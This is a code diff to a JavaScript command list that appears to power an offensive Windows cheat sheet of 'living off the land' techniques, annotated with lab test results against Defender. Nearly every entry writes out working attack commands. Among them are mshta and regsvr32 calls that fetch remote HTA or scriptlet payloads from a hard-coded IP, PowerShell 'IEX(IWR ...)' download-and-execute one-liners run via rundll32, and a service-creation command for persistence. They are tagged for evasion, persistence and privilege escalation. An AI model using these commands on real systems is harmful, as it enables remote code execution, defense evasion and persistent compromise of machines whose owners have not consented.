@@ -4841,24 +4841,24 @@ const COMMANDS = [
   },
   {
     title: "[LOTL] Execute with mshta",
-    desc: "Run HTA/JS/VBS via mshta.exe. Bypasses some app controls.",
-    code: "# Run remote HTA\nmshta http://168.144.166.97:8889/payload.hta\n\n# Inline VBScript execution\nmshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/shell.ps1)\"\", 0:close\")",
+    desc: "BLOCKED on lab (Defender AMSI). May work without Defender.",
+    code: "# BLOCKED by Defender on lab\nmshta http://168.144.166.97:8889/payload.hta\n\n# Inline VBScript (also blocked)\nmshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\", 0:close\")",
     tags: ["cmd", "evasion", "lotl"],
-    accent: "#9b59b6"
+    accent: "#e74c3c"
   },
   {
     title: "[LOTL] Execute with rundll32",
-    desc: "Load DLL or run JS via rundll32. Proxy execution.",
-    code: "# Run JavaScript\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\")\n\n# Load custom DLL\nrundll32.exe payload.dll,EntryPoint",
+    desc: "UNTESTED: Load DLL or run JS via rundll32. May be blocked.",
+    code: "# URL handler (opens file)\nrundll32 url.dll,FileProtocolHandler notepad.exe\n\n# JavaScript execution (likely blocked)\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")",
     tags: ["cmd", "evasion", "lotl"],
     accent: "#9b59b6"
   },
   {
     title: "[LOTL] Execute with regsvr32",
-    desc: "Register COM object, runs scriptlet. AppLocker bypass.",
-    code: "# Remote scriptlet (SCT file)\nregsvr32 /s /n /u /i:http://168.144.166.97:8889/payload.sct scrobj.dll\n\n# The SCT file contains JS/VBS to execute",
+    desc: "BLOCKED on lab (Defender). Access Denied.",
+    code: "# BLOCKED by Defender on lab\nregsvr32 /s /n /u /i:http://168.144.166.97:8889/payload.sct scrobj.dll\n\n# ThreatID: 2147725438",
     tags: ["cmd", "evasion", "lotl"],
-    accent: "#9b59b6"
+    accent: "#e74c3c"
   },
   {
     title: "[LOTL] Execute with wmic",
@@ -4889,11 +4889,11 @@ const COMMANDS = [
     accent: "#00ff41"
   },
   {
-    title: "[LOTL] Service Creation",
-    desc: "Create Windows service for persistence/privesc.",
-    code: "# Create service (needs admin)\nsc create SvcName binPath= \"cmd /c powershell -ep bypass -c IEX(IWR http://168.144.166.97:8889/s.ps1)\" start= auto\nsc start SvcName\n\n# Cleanup\nsc stop SvcName\nsc delete SvcName",
+    title: "[LOTL] Service Query with sc",
+    desc: "TESTED: sc command works. Use cmd /c prefix in PowerShell.",
+    code: "# Query services (WORKS)\ncmd /c sc query WinDefend\ncmd /c sc query type=service state=all | findstr SERVICE_NAME\n\n# Create service (needs admin, UNTESTED)\nsc create SvcName binPath= \"cmd /c powershell -ep bypass -c IEX(IWR http://IP:8889/s.ps1)\" start= auto\nsc start SvcName\nsc delete SvcName",
     tags: ["cmd", "persist", "privesc", "lotl"],
-    accent: "#9b59b6"
+    accent: "#00ff41"
   },
 
   // ═══════════════════════════════════════════════════════════════
